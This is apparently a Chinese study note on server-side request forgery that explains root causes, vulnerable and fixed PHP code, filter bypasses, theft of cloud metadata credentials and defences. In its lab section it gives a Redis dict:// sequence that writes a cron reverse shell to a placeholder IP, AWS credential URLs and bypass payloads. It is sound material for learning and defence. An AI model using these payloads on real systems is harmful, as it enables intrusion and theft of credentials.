## 1. SSRF 是什么、为什么会存在 🔴 核心 —— 必须吃透,动手复现

### 1.1 它是什么

SSRF(**Server-Side Request Forgery**,服务端请求伪造):攻击者能够让**服务器**去发起一个由攻击者控制地址的请求,而服务器没有对这个地址做严格校验。

> 类比:你(攻击者)在公司前台(公网 Web 服务器)办事。前台桌上有个内线电话,只能拨公司内部分机(内网),外人碰不到。SSRF 就相当于:你写一张纸条"请帮我拨 8008 分机并把对方说的话记下来给我",前台不加思索照做了。于是**你借前台的手,打通了你本来没资格打的内线**。
>
> 类比哪里和真实不同:真实 SSRF 里"前台"不只是转达,很多时候它会把拨通后拿到的**完整内容**(网页、文件、banner)原样回显给你,甚至在你看不到回显时,你还能从"拨通/拨不通""响应快慢"去推断内网情况。

### 1.2 为什么会存在(原理 / root cause)

走一遍"正常 → 出事"这条线,你就抓住了 SSRF 的本质:

1. **正常流程**:很多业务需要服务端主动去访问一个 URL。比如"分享功能"要去抓取对方网页的标题做预览,"图片下载"要去把图片拉到本地。开发者写了类似"拿到用户给的 URL → 服务端 `curl`/`file_get_contents` 去请求它 → 把结果展示出来"的逻辑。
2. **开发者的假设**:开发者默认"用户给的 URL 是一个正常的外部网站"。他只想到了 `http://example.com/a.jpg` 这种情况。
3. **攻击者打破假设**:攻击者不给外部网址,而给 `http://127.0.0.1/`(服务器自己)、`http://192.168.1.1/`(内网)、`file:///etc/passwd`(本机文件)、`http://169.254.169.254/`(云元数据)。
4. **后果**:因为**发起请求的是服务器**,而服务器往往处在内网、能访问很多外部打不到的资源,于是攻击者就借服务器的网络位置和身份,访问了本不该被外部访问的东西。

一句话 root cause:**程序把"用户提供的地址"当成了"可信的、要去访问的目标",既没限制地址范围,也没限制协议。** 信任了不该信任的输入 —— 这和 SQL 注入"把数据当指令"是同一类错误的变体:这里是"把用户给的地址当成自己该去访问的地址"。

**数据流(记住这条,挖洞时在脑子里套)**:

```
用户可控的 URL/IP 参数  ──►  服务端发请求的函数(curl / file_get_contents / requests.get / URL.openStream)  ──►  访问了内网/本机/云资源  ──►  结果回显 或 盲态可推断
        source                              sink                                          危害
```

**代码层面长什么样**(PHP 为例,这是审计时要会认的模式)

```php
// ❌ 有问题的写法
// source:用户通过 GET 参数 url 完全控制目标地址
$url = $_GET['url'];
// sink:服务端直接拿去请求,没有任何对 host/协议的校验
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// 很多 SSRF 之所以能用 file:// / gopher://,就是因为没限制协议:
// CURLOPT_PROTOCOLS 没设,curl 默认支持一大票协议
echo curl_exec($ch);   // 把内网/本机的响应原样回显给攻击者
```

```php
// ✅ 修复后的写法(思路,不是唯一写法)
$url = $_GET['url'];
$host = parse_url($url, PHP_URL_HOST);
$scheme = parse_url($url, PHP_URL_SCHEME);

// 1) 只允许 http/https,堵死 file:// gopher:// dict:// 等
if (!in_array($scheme, ['http', 'https'])) { die('bad scheme'); }
// 2) 把域名解析成 IP,拒绝内网/保留地址(关键:解析后再判断,防域名绕过)
$ip = gethostbyname($host);
if (is_internal_ip($ip)) { die('internal ip blocked'); }
// 3) 限制端口为 80/443
// 4) 禁止跟随 3xx 重定向,或重定向后重新校验
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
```

**审计时的警觉信号**:看到 `curl_exec` / `file_get_contents` / `fsockopen` / `readfile`(PHP)、`requests.get` / `urllib.urlopen`(Python)、`URL.openConnection` / `ImageIO.read`(Java),而它的目标 URL 来自用户输入、又没有对协议和 host 做白名单 —— 基本就是 SSRF 候选点。

### 1.3 SSRF 的三种危害形态

SSRF 的危害,按从小到大排:

1. **读本机资源**:`file:///etc/passwd`、`http://127.0.0.1:端口/` —— 拿本机文件、探本机只监听 `127.0.0.1` 的服务(这些服务外网根本连不上)。
2. **探测 + 攻击内网**:`http://172.72.23.22/`、`http://192.168.x.x:6379/` —— 服务器在内网,借它扫内网存活主机、开放端口,再打内网服务。
3. **访问云端/外部受限资源**:`http://169.254.169.254/`(元数据)或某些只对"服务器 IP"放行的接口。

> [!warning] ⚠️ 关于你贴的两张图:认准图2,图1 是易混淆的错误配图
> - **图2(攻击者 → 有 SSRF 的 WEB 服务器 → 内网 Redis/MySQL/Tomcat / 云资源)才是 SSRF 的正确原理图**。记这张:攻击者**碰不到**内网,服务器**碰得到**,攻击者诱导服务器替自己去碰。
> - **图1(Hacker → Server → Client,"欺骗数据包 / 受害者响应")不是 SSRF**。它更像**反射 / 中继式**攻击的示意。关键破绽:图里有个"**受害者 Client**"的角色,而 SSRF 里**根本没有"受害者客户端"这个角色** —— SSRF 中被"骗去发请求"的**服务器自己**才是被利用方,它请求的目标是内网资源 / 本机文件 / 云元数据,不是某个"会响应的受害客户端"。
> - 结论:讲 SSRF 原理一律以图2为准;图1 留着只是提醒自己别把这两种模型搞混。

### 1.3′ SSRF 打"服务器自身":为什么能绕过 /admin 登录

> [!note] 🔎 补充(并入你早期那份 portswigger SSRF 笔记的要点)
> 这段是你上传的《SSRF 服务端请求伪造完整笔记》里讲得最透的部分,root cause 层面很关键,合并进来。

最经典的 SSRF 场景之一:一个"查门店库存"的功能,把要请求的接口地址当参数交给后端代发:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

服务器老老实实"请求自己"的 `/admin`,把后台管理页面当成"库存结果"回显给攻击者。**为什么直接用浏览器访问 `/admin` 要登录、从本机发就不用?** 因为很多系统把"**请求的网络来源**"错当成了"**请求是否可信**"的判断依据。具体有三类常见原因:

1. **权限校验在前置组件,被回环绕过**:登录校验做在应用**前面**的反向代理 / WAF / 网关上,这类校验只拦"从外部进来"的流量。当请求是"服务器绕回自己"时,流量没经过那层,校验直接被跳过。
2. **灾难恢复后门**:应用故意设计成"来自本机的请求无需登录即可管理",用于管理员丢失凭据时从本机恢复。前提假设是"只有可信的人才能在本机操作" —— SSRF 恰好让远程攻击者**伪装成本机**,打破了这个假设。
3. **管理端口的隐性隔离被穿透**:管理后台监听在另一个端口,设计意图是"外部网络不可达",于是放松了该端口的鉴权。但服务器自己发请求不受"外部不可达"的网络隔离限制,SSRF 把这层隔离穿透了。

**一句话 root cause(和 §1.2 同源)**:系统把"网络来源"当成了隐性的身份凭证,而 SSRF 的本质就是**伪造这个来源**,让受限请求"看起来"像从可信位置发出。这也是 SSRF 常被定为高危甚至严重的原因。

### 1.4 业务里长什么样(案例锚点)

> **真实案例:Capital One 数据泄露(2019)** — SSRF 在云时代的"封神之战"
>
> - **发生了什么**:攻击者(Paige Thompson,前 AWS 员工)利用 Capital One 一台部署在 AWS EC2 上、配置不当的 WAF(ModSecurity)存在的 SSRF,让这台服务器去请求 AWS 的**实例元数据服务**地址 `http://169.254.169.254/`。
> - **根因对应本笔记哪一环**:正是 §1.2 的 root cause + §4 的云元数据利用 —— 服务端能被诱导去访问那个只有"本机"才够得着的内部地址,而那个地址会吐出这台机器所绑定的 **IAM 角色临时凭证**。
> - **业务后果**:攻击者用偷到的云凭证访问了后端 S3 存储桶,导出了约 **1.06 亿** 名美国和加拿大信用卡申请人的数据(约 1 亿美国 + 600 万加拿大)。Capital One 后续面临监管罚款与集体诉讼,这成了"SSRF + 云配置"教科书级事故。
> - **渗透测试者的启发**:在云上,SSRF 的终点往往不是"读一个文件",而是 `169.254.169.254` —— 一旦够得到元数据服务拿到 IAM 凭证,危害从"信息泄露"直接跳级到"接管云账户的一部分资源"。**看到 SSRF,第一个该试的内网地址之一就是云元数据。**
>
> 来源:Krebs on Security、Wired、美国司法部公开起诉资料等非中国大陆来源的公开报道。

### 1.5 实战怎么用

- **什么时候该想到它**:只要看到"**服务端替你去访问一个地址**"的功能 —— 分享预览、URL 转图片、在线翻译整个网页、从 URL 导入头像、webhook 回调测试、PDF/图片远程加载、第三方登录里的 `redirect_uri` 回拉…… 任何"你给个 URL,服务器帮你去拿"的地方。
- **怎么验证(最小、无破坏)**:
  1. 先用一个**你自己控制的外部地址**(如你的 VPS、或 Burp Collaborator / 一个 DNSLog 平台域名)。把目标参数填成 `http://你的域名/ssrf-test`。
  2. 如果你的服务器/DNSLog 收到了来自**目标服务器 IP** 的请求 —— 实锤:确实是服务端在发请求,而且地址你能控。
- **怎么判断结果**:
  - 有回显:页面把你给的地址的内容显示出来了 → 直接能读内网/本机响应,危害大。
  - 无回显但 DNSLog 有记录 → "盲 SSRF",仍可用(见下)。
  - 响应时间差异:访问存活端口和不存活端口,服务器响应快慢/报错不同 → 可用于**盲态端口探测**。
- **下一步**:
  1. 探本机:`http://127.0.0.1:端口` 逐个试常见端口。
  2. 探云:`http://169.254.169.254/`(§4)。
  3. 探内网:结合你能推断出的内网段扫描。
  4. 升级利用:协议允许的话用 gopher 打 Redis/MySQL(§6)。
- **怎么证明影响(写报告的关键)**:别停在"它会发请求"。要给出**最小但确凿**的证据链,例如:
  - 截图 `file:///etc/passwd` 读到的内容,或内网某管理后台首页;
  - 读到云元数据里的 IAM 角色名(不必真的动用凭证去删东西,读到凭证本身就足以定级为严重);
  - 一句话说清后果:"可读取内网 X 服务 / 云账户 Y 资源,影响 Z"。在 Bug Bounty 里,**能证明够到内网或元数据的 SSRF**和**只能打外网的 SSRF**,评级天差地别。

### 1.6 防御与检测视角(简短)

见 §7。知道防守方是"协议白名单 + 解析后判内网 IP + 禁重定向 + 云上开 IMDSv2",你就知道绕过思路从哪来:绕协议限制、绕 IP 判断(进制/域名/重定向)、抢在解析和使用之间做手脚(DNS Rebinding)。

### 1.7 易错点

- **把 SSRF 当成 XSS/重定向**:SSRF 是**服务器**去发请求,不是浏览器。判断标准永远是"发请求的 IP 是不是目标服务器"。用 DNSLog 看来源 IP 最靠谱。
- **无回显就放弃**:盲 SSRF 照样有价值 —— DNSLog 确认、时间盲打端口、gopher 打无回显的 Redis 一样能 getshell。
- **只会填 `http://127.0.0.1`**:很多防护就是拦 `127.0.0.1` 和 `localhost` 这两个字符串,换个写法(§5)立刻绕过。

## 2. SSRF 漏洞挖掘:在哪找、看到什么该警觉 🔴 核心 —— 必须吃透

挖 SSRF 的本质就一句话:**找到所有"服务端会拿着某个用户可控的地址去访问"的入口。** 分黑盒和白盒两条路。

### 2.1 黑盒:哪些功能点天生带 SSRF 基因

这些功能的共同点都是"服务器替你去拿远端内容",挖洞时见到就重点测:

| 功能点 | 为什么容易有 SSRF |
|---|---|
| 社交分享 / URL 预览 | 服务端要抓对方网页的 title、缩略图来做卡片 |
| 转码 / 网页另存 | 服务端去拉原网页再加工(如适配手机) |
| 在线翻译(整页翻译) | 你给网址,它去把那一页抓回来翻译 |
| 图片 / 文件远程加载、下载 | 富文本里"从 URL 下载图片到本地" |
| 收藏 / 稍后读 | 取 URL 的 title 和正文做展示 |
| webhook / 回调地址测试 | 服务端主动去 POST/GET 你填的回调 URL |
| 网站采集 / 抓取 | 你输入 URL,它去采集信息 |
| 云厂商的"存活检测/拨测" | 服务端远程请求你给的地址判断是否存活 |
| 编码/文档处理组件 | ffmpeg、ImageMagick、xml 处理器、PDF 生成器等内部会去取远程资源 |
| 数据库内置远程功能 | 如 MongoDB 的 copyDatabase 等 |
| 未公开 API | 可用搜索引擎语法配合关键字去挖 |

> 挖洞小技巧:这些功能很多会在请求里暴露一个"地址类"参数,改成你的 DNSLog 域名,看服务器会不会来访问。

### 2.2 关键参数名(看到这些优先测 SSRF)

抓包时在请求里 grep 这些参数名,它们十有八九是"地址":

```
url   uri   link   src   source   sourceURL   imageURL
domain   target   u    display   wap   share   callback   path   page
```

### 2.3 白盒:代码审计怎么找

审计时去定位两类函数(就是 §1.2 说的 sink):

- **发请求类**:`curl_exec`、`file_get_contents`、`fsockopen`、`fopen`、`readfile`(PHP);`requests`、`urllib`、`httplib`(Python);`URL.openConnection`、`HttpClient`、`ImageIO.read`(Java)。
- **文件/资源加载类**:`file://` 能触达的读取、XML 外部实体解析(XXE 常和 SSRF 连体)、模板/图片/字体远程加载。

找到后往上回溯:它请求的地址是不是来自用户输入?中间有没有对协议和 host 做白名单?没有 → SSRF。

> **实战怎么用**:黑盒先用 §2.1/§2.2 快速锁定候选参数,用 DNSLog 一把验证"服务端是否真的去请求"。能拿到源码时用 §2.3 精确定位,顺带判断支持哪些协议(决定 §3 能用到哪一步)。

## 3. 伪协议利用:决定 SSRF 能造成多大危害 🔴 核心 —— 必须吃透,重点练 gopher

**为什么重要**:同一个 SSRF 点,只能用 `http://` 的,顶多读读内网网页;能用 `file://` 的,能读本机任意文件;能用 `gopher://` 的,能**向任意 TCP 服务发任意字节**,直接把 SSRF 升级成打 Redis、MySQL 的 RCE。所以"这个点支持哪些协议"直接决定危害上限。

> 一句话原理:很多后端用 `curl` 这类库去发请求,而 `curl` 本身支持一大堆协议。如果开发者没用白名单限制,攻击者就能把 `http` 换成 `file`/`dict`/`gopher`,让服务器干完全不同的事。

### 3.1 各伪协议速查 🟡(除 gopher/file 外,用到会查)

| 协议 | 作用 | 示例 | 常见度 |
|---|---|---|---|
| `http(s)://` | 普通 Web 访问,探内网网页 | `http://127.0.0.1/` | 🔴 必用 |
| `file://` | 读本机文件系统 | `file:///etc/passwd` | 🔴 必用 |
| `dict://` | 字典服务器协议,可向端口发简单文本命令 | `dict://127.0.0.1:6379/info` | 🟡 常用(打 Redis) |
| `gopher://` | 可构造任意 TCP 字节流,万能利用协议 | 见 §3.3 | 🔴 必练 |
| `sftp://` `tftp://` `ldap://` | 对应各自服务的协议 | — | ⚪ 扫过,知道 curl 支持即可 |

### 3.2 `file://` 读文件 🔴

- 做什么:把参数填成 `file:///etc/passwd`(Linux)或 `file:///c:/windows/win.ini`(Windows)。
- 为什么:`file://` 让"发请求"变成"读本地文件",绕过了一切网络层面的访问控制。
- 得到什么:回显出文件内容 → 实锤任意文件读取。读不到:可能协议被白名单挡了,或没回显(换其他验证)。
- 用途:读配置文件(数据库密码)、读 `/etc/passwd` 证明危害、读源码。

### 3.3 `gopher://` —— 把 SSRF 变成"万能武器" 🔴 核心,重点练

**为什么它最强**:HTTP 协议帮你把请求包装成 HTTP 格式,你没法用它去和 Redis、MySQL 这种"非 HTTP 协议"的服务对话。而 **gopher 允许你逐字节地指定要发送的内容** —— 等于你能对着目标端口发送"任意原始数据"。Redis、MySQL 的通信是基于 TCP 的文本/二进制协议,只要你能发任意字节,就能伪造成它们的客户端去下命令。

- **它长什么样**:`gopher://IP:端口/_` 后面跟 URL 编码后的原始数据。那个 `_` 是占位符(gopher 协议规定第一个字符会被丢弃),所以**真正的数据从第二个字符开始**,别把它漏了,否则命令第一个字节会丢。
- **怎么生成**:手搓容易错,用工具 **Gopherus**(`https://github.com/tarunkant/Gopherus`)按服务类型自动生成 payload。还有一个专门收集 SSRF 靶场和 payload 的仓库:`https://github.com/sqlsec/ssrf-vuls`。

| 片段 | 作用 | 为什么需要 |
|---|---|---|
| `gopher://` | 指定用 gopher 协议 | 只有它能发任意字节,打非 HTTP 服务 |
| `172.72.23.27:6379` | 目标服务的 IP:端口 | 内网 Redis 的地址 |
| `/_` | 占位符,第一个字符会被协议吃掉 | 保证真正的命令字节不丢第一个 |
| URL 编码后的命令流 | 伪装成 Redis/MySQL 客户端的原始数据 | 服务收到后当成合法客户端命令执行 |

> **易错点(高频踩坑)**:gopher 的 payload 里,`\r\n`(回车换行)必须正确编码为 `%0d%0a`。有些场景因为服务端用 `curl` 又经过一层,需要**二次 URL 编码**(把 `%` 再编码成 `%25`)。打不通时,优先检查"编码了几次""`_` 占位有没有漏"。

### 3.4 实战怎么用(伪协议整体)

- **触发线索**:确认了 SSRF 后,先探协议支持:试 `file:///etc/passwd` 看能不能读文件;试 `dict://自己VPS:端口` 看 gopher/dict 通不通。
- **决策分叉**:只支持 http → 老老实实探内网 Web 和端口;支持 file → 至少能任意文件读;支持 gopher/dict → 直奔内网 Redis/MySQL 打 RCE(§6)。
- **证明影响**:能 `file://` 读到 `/etc/passwd` 或配置里的明文密码,就是扎实的证据。

## 4. 🔎 补充:云元数据利用 —— 现代 SSRF 的"核武器" 🔴 核心 —— 必须吃透

> [!note] 🔎 补充(非原笔记内容)
> 你贴的原笔记完全没提这块,但这是**现在 Bug Bounty 和云环境渗透里 SSRF 最值钱的利用方向**,也是 §1.4 Capital One 事件的技术核心。单独拎出来讲。

### 4.1 它是什么、为什么存在

云服务器(AWS EC2、GCP、阿里云等)都提供一个**实例元数据服务**(Instance Metadata Service, IMDS):运行在一个固定的"链路本地地址" `169.254.169.254` 上,**只有这台机器自己**能访问。它用来让实例查询自己的信息 —— 包括最要命的一项:这台机器绑定的**云身份临时凭证**(AWS 的 IAM 角色 Access Key / Secret / Token)。

- root cause:IMDS 当初的设计假设是"只有本机进程才会去请求 `169.254.169.254`,所以请求它的一定可信,不用鉴权"。**但 SSRF 恰好让攻击者能借服务器之手去请求本机地址** —— 这个"只有本机能访问"的前提被打穿了,于是无需任何认证就能读到云凭证。

### 4.2 怎么做(AWS 为例,教学/靶场粒度)

```
# 1) 列出这台机器绑定的 IAM 角色名
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2) 用上一步拿到的角色名,取该角色的临时凭证
http://169.254.169.254/latest/meta-data/iam/security-credentials/<角色名>
```

| 步骤 | 做什么 | 为什么 | 得到什么 |
|---|---|---|---|
| 1 | 请求 `.../security-credentials/` | 先问出角色名,下一步要用 | 一个角色名字符串 |
| 2 | 请求 `.../security-credentials/<角色名>` | 换取该角色的临时 AK/SK/Token | 一段 JSON,含 `AccessKeyId`、`SecretAccessKey`、`Token` |

拿到这组凭证后,攻击者就能用 AWS CLI 以这台机器的身份去操作它有权限的云资源(如 §1.4 里的 S3)。

> GCP 的元数据地址同样是 `169.254.169.254`(或 `metadata.google.internal`),但**要求请求头带 `Metadata-Flavor: Google`** —— 这既是它的一道小门槛,也意味着"只能控制 URL、不能控制请求头"的 SSRF 对 GCP 元数据不一定打得动。这点能帮你判断目标在哪家云、能不能打。

### 4.3 实战 & 防御

- **实战触发线索**:确认 SSRF 后,如果判断目标跑在公有云上(响应头、IP 归属、报错信息能透露),**第一批要试的内网地址就包含 `169.254.169.254`**。读到凭证即为严重漏洞,截图角色名+凭证字段(打码)作为证据即可,不要真的拿去操作资源。
- **防御(AWS 的正解:IMDSv2)**:IMDSv2 要求先用 `PUT` 请求换一个一次性 session token(带特定请求头),后续请求必须带上这个 token;并且默认把响应的 **hop limit 设为 1**,阻止请求被转发/代理出去。效果:纯"只能控 URL、发 GET"的 SSRF 很难再偷到凭证,因为它既发不了带特定头的 PUT,也过不了 hop limit 这关。这也是 Capital One 之后业界把 IMDSv2 当标配的原因。

## 5. 绕过防护:过滤了内网 IP / 域名怎么办 🟡 重要 —— 懂原理,用到会查

**为什么要会**:真实目标和 CTF 里,SSRF 点常常加了一层校验:"只允许某域名""禁止内网 IP"。绕过这些校验是 SSRF 从"看着像有"到"真能利用"的临门一脚。核心就两类:**绕"必须是某域名"** 和 **绕"不许是内网 IP"**。

### 5.1 绕"限制必须是 www.xxx.com 这个域名"

利用 URL 里的 **userinfo** 语法 `scheme://user@host`:`@` 之前的部分是用户名,真正访问的是 `@` 之后的 host。

```
http://www.xxx.com@127.0.0.1/flag.php       # 真正访问的是 127.0.0.1
http://ctf.@127.0.0.1/flag.php?show         # 校验看到了 www/ctf 字样却仍访问 127.0.0.1
```

- 原理:校验代码如果只用"字符串里包含 www.xxx.com"来判断,就会被 `@` 骗过 —— 它满足了"包含该域名",但浏览器/curl 实际连的是 `@` 后面的地址。

### 5.2 绕"不许是内网 IP"

当它拦截 `127.0.0.1` / `localhost` / 内网段时,换一种"看起来不是内网、解析出来却是内网"的写法:

| 绕法 | 示例(以 127.0.0.1 为例) | 原理 |
|---|---|---|
| 十六进制 | `http://0x7f.0.0.1/` 或 `http://0x7f000001/` | IP 本质是个 32 位整数,各种进制都能表示,过滤只认十进制点分 |
| 八进制 | `http://0177.0.0.1/` | 同上 |
| 十进制整数 | `http://2130706433/` | `127.0.0.1` 转成一个大整数,照样能访问 |
| 省略写法 | `http://127.1/` | `127.0.0.1` 的合法简写,长度短、绕长度限制和关键字匹配 |
| `0` / `0.0.0.0` | `http://0/` `http://0.0.0.0/` | 在很多系统里 `0` 会被解析为本机 |
| CIDR/同段 | `http://127.127.127.127/` | 整个 127.x.x.x 段都是环回 |
| **域名解析** | 把你控制的域名(如 `test.xiaodi8.com`)A 记录指到 `127.0.0.1` | 校验看到的是普通域名,解析后却是内网地址 |
| **3xx 重定向** | 你的 VPS 上放 `header("Location: http://127.0.0.1/flag.php");`,SSRF 填你的 VPS 地址 | 校验时你的地址是合法外网,服务器跟随跳转才到内网 |
| **短网址** | 把内网地址做成短链 | 校验时是短链域名,展开后才是内网 |

- **怎么判断用哪招**:先搞清它拦的是"字符串关键字"(换进制/简写/@ 就行)还是"解析成 IP 再判断"(得用域名解析/重定向/DNS Rebinding)。

### 5.3 DNS Rebinding(DNS 重绑定) 🟢 了解 —— 建立概念,备查

当防护是"先把域名解析成 IP、判断不是内网、再去访问"时,前面的域名解析招数会被识破。DNS Rebinding 的思路是**在"校验时的那次解析"和"真正访问时的那次解析"之间,让同一个域名解析出不同的 IP**:

- 校验那一刻:域名解析到一个**外网 IP**,通过检查。
- 真正访问那一刻:同一域名再解析,这次返回 `127.0.0.1` 或内网 IP。

**可迁移的思路**:这是一类"**TOCTOU**(检查时间与使用时间不一致)"攻击 —— 只要"校验"和"使用"是两次独立操作、中间状态能被改变,就可能绕过校验。这个思路在文件操作、权限判断等很多地方都能复用,值得记住"检查和使用之间有缝可钻"这个直觉。
**细节备查**:具体要自建一个短 TTL 的恶意 DNS 服务(或用现成的 rebinding 平台),真用时再查搭建方法,不用背。

## 6. 打内网服务:gopher 把 SSRF 升级成 RCE 🟡 重要 —— 懂原理,用到会查

**定位**:下面这些是"手上已经有一个支持 gopher/dict 的 SSRF,内网又正好有对应服务"时的具体打法。属于**用到会查**的 cheat sheet,不用背命令,理解"为什么能打通"就够。所有 payload 对应你贴的靶场拓扑(内网 `172.72.23.2x` 那一排)。

> 共同原理:gopher/dict 让你能对内网服务的端口**发任意原始命令**。于是你把"攻击者 → 内网服务"的那次通信,伪装成"内网服务的合法客户端"发出的命令,服务端无法分辨,照单执行。

### 6.1 打 Redis(未授权)→ 写计划任务反弹 shell

如果你之前整理过 **Redis 未授权访问**的笔记,这里只回顾一句:Redis 默认无密码、能写磁盘文件,于是可以把恶意内容写进"会被系统执行"的位置。用 SSRF 的 `dict://`/`gopher://` 远程下这串命令:

```
# 清空原有 key,避免干扰
dict://172.72.23.27:6379/flushall
# 把 Redis 的工作目录设成 crontab 目录
dict://172.72.23.27:6379/config set dir /var/spool/cron/
# 把要保存的文件名设成 root(即 root 的计划任务文件)
dict://172.72.23.27:6379/config set dbfilename root
# 写入一条反弹 shell 的 cron 任务
dict://172.72.23.27:6379/set x "\n* * * * * /bin/bash -i >& /dev/tcp/你的IP/2333 0>&1\n"
# 保存落盘,让上面的设置生效
dict://172.72.23.27:6379/save
```

| 命令 | 为什么这么做 |
|---|---|
| `config set dir /var/spool/cron/` | 把 Redis 的写入目录指向 Linux 定时任务目录 —— 这是"让写入的文件被系统自动执行"的关键 |
| `config set dbfilename root` | 文件名设为 root,落盘后就是 `/var/spool/cron/root`,即 root 的 crontab |
| `set x "...cron..."` | 把一条每分钟执行的反弹 shell 写进某个 key |
| `save` | 把内存数据(含那条 cron)dump 到上面指定的文件,定时任务由此生效 |

> 结果:约一分钟后,你的监听端口(`nc -lvnp 2333`)会收到来自内网 Redis 主机的反弹 shell。
> 易错点:payload 里的换行、`>&`(在 URL 里常要写成 `%26` 等编码)要编码正确;实战中整条命令还要按 §3.3 的规则做 gopher 编码。用 Gopherus 生成最省心。

### 6.2 打 MySQL(弱口令/空口令)

用 Gopherus 的 mysql 模块生成 payload:

```
python2 gopherus.py --exploit mysql
# 然后按提示输入:用户名(如 root)、要执行的 SQL(如 show variables like '%plugin%')
# 它会吐出一条 gopher:// payload,把它填进 SSRF 参数;注意按场景再做一次 URL 编码
```

- 原理:MySQL 客户端在**无密码**时的握手包是可预测的,Gopherus 帮你把"登录 + 执行 SQL"的原始字节流拼好,gopher 发过去,MySQL 以为是正常客户端。
- 用途:在内网 MySQL 上查数据,或在有写权限/特定配置时进一步利用。

### 6.3 打 Tomcat → 上传 JSP Web Shell 🟡

当内网有可 PUT 的 Tomcat(如靶场里的 `172.72.23.26:8080`)时,用 HTTP 的 `PUT` 方法直接传一个 JSP 文件上去,这个 JSP 就是一个能执行系统命令的 **Web Shell**(通过 URL 参数 `cmd` 传命令,服务端用 `Runtime.getRuntime().exec()` 执行并回显)。

- 原理:某些配置下 Tomcat 允许 `PUT` 写文件到可访问目录,写进去的 `.jsp` 会被当作可执行页面解析。
- 用途:传上去后访问 `xxx.jsp?cmd=id` 即可执行命令。属于"内网有 Tomcat 且配置不当"才用得上的点,用到时回来看原笔记里那段 JSP 模板即可,不用背。

### 6.4 命令执行类靶场(直接拼接)⚪ 扫过 —— 靶场特定,知道即可

原笔记里那个 `ip=127.0.0.1;cat /flag` 的 POST,本质是**命令注入**(`;` 拼接命令),不是 SSRF 的核心机制,只是同一套靶场里的另一个关卡。命令注入请看你的命令注入笔记,这里不展开。

## 7. 防御与检测视角 🟢 了解 —— 读一遍,反推绕过思路

知道防守方怎么修,就知道该往哪绕(每条后面括号是对应的绕过方向):

1. **过滤/校验响应**:验证远端对请求的响应是否符合预期,不符合就不回显。(→ 逼你走盲打)
2. **统一错误信息**:让攻击者无法靠报错差异判断端口开/关。(→ 逼你靠时间差而非报错)
3. **端口白名单**:只允许 80/443/8080 等 HTTP 常用端口。(→ 限制你打 6379/3306 这类服务)
4. **内网 IP 黑/白名单**:禁止访问内网段。(→ 对应 §5 的进制/域名/重定向/Rebinding 绕过)
5. **协议白名单**:只允许 http/https,禁用 file/gopher/dict/ftp。(→ 直接废掉 §3、§6 的大部分威力,所以这是最关键的一道)
6. **云上开 IMDSv2**:见 §4.3。(→ 废掉纯 GET 型 SSRF 偷元数据)
7. **去掉对"请求来源"的隐性信任**:管理接口等敏感功能统一走身份验证,**绝不能"请求来自本机/内网就当可信"**。这条针对的正是 §1.3′ 那个 root cause —— 很多严重 SSRF 的真正病根不在"能发请求",而在"本机请求被免登录放行"。(→ 这条修对了,SSRF 打到 `/admin` 也拿不到东西)
8. **出网最小化(网络层)**:应用服务器不该访问的内网段/端口,在网络策略层面直接禁掉,而不只靠代码里过滤。(→ 让你即便绕过代码校验,网络层也不通)

> 一句话:**最有效的单条防御是"协议白名单 + 把域名解析成 IP 后再判内网 + 禁止跟随重定向"三件一起上**;少一件就留一条绕过的缝。而第 7 条(别拿网络来源当身份)是防"打服务器自身"那类 SSRF 的根上一招。

## 8. 把它串起来:SSRF 利用决策流程

```
发现"服务端替用户访问地址"的功能点(§2)
        │
        ▼
用 DNSLog / 外部地址验证:服务器真的去请求了吗?(§1.5)
        │ 是
        ▼
探协议支持(§3):能用 file:// 吗?能用 gopher:// 吗?
        │
        ├─ 只支持 http ──► 探本机端口 + 探内网 Web/端口 ──┐
        ├─ 支持 file   ──► 读 /etc/passwd、配置文件 ──────┤
        ├─ 支持 gopher ──► 打内网 Redis/MySQL/… 求 RCE(§6)┤
        │                                                   ▼
        └─ 判断在公有云? ──► 试 169.254.169.254 偷云凭证(§4)
        │
        ▼
被过滤了?(只允许某域名 / 禁内网 IP)──► 按 §5 选绕过招式
        │
        ▼
固定证明影响:读到了什么文件/内网服务/云凭证,写进报告(§1.5)
```

每个分叉的判断依据:**"这个 SSRF 点支持的协议 + 目标所处的网络位置(自建内网 / 公有云)"** 共同决定你走哪条利用路线。

## 9. 自测(先自己想,再看答案)

1. 用自己的话说:为什么"服务端替用户去访问一个 URL"这件事本身就危险?危险的根源是什么?
2. 场景题:某站点有个"输入图片 URL,帮你下载到相册"的功能。你会怎么在不破坏目标的前提下,验证它有没有 SSRF?验证成立后,如果你判断它跑在 AWS 上,下一步第一个要试的地址是什么?
3. 排错题:你确认了一个 SSRF,`file:///etc/passwd` 却读不出内容,`http://你的VPS/` 也收不到请求。可能是哪几个原因?
4. 为什么 gopher 协议在 SSRF 利用里被称为"万能协议"?它和 http 协议的本质区别是什么?

<details>
<summary>参考答案</summary>

1. 根源是**服务器信任了用户给的地址、又不限制范围和协议**。服务器往往处在内网、能访问外部打不到的资源(内网主机、本机只听 127.0.0.1 的服务、云元数据),攻击者借它的网络位置和身份去访问这些资源。本质是"信任了不该信任的输入"。
2. 把图片 URL 填成你的 DNSLog/Collaborator 域名,看是否收到来自**目标服务器 IP** 的请求 —— 收到即成立。判断在 AWS 上,下一步第一个试 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,尝试读 IAM 角色凭证。
3. 可能:① 协议被白名单限制了(file/gopher 被禁,只剩 http);② 有出网限制,服务器根本不能访问外网你的 VPS(但仍可能能访问内网 —— 换内网地址试);③ 是盲 SSRF 没回显(用时间差/DNSLog 侧信道);④ 目标参数其实没进到发请求的函数(验证点选错了)。
4. 因为 gopher 能**逐字节构造任意 TCP 发送内容**,可以伪装成 Redis、MySQL 等非 HTTP 服务的客户端。http 协议会把你的请求强制包装成 HTTP 报文格式,没法和"不是 HTTP 的服务"对话;gopher 没有这个限制,所以能打的服务范围大得多。

## 10. 待核实 / 存疑

- 原笔记里 `dict://` 示例写成 `dict:///ip:6739/info`:端口应为 Redis 的 `6379`(疑似笔误写成 6739),且 `dict://` 后一般是 `dict://host:port/`(两个斜杠),三斜杠写法按实现可能不生效 —— 以靶场实际为准。
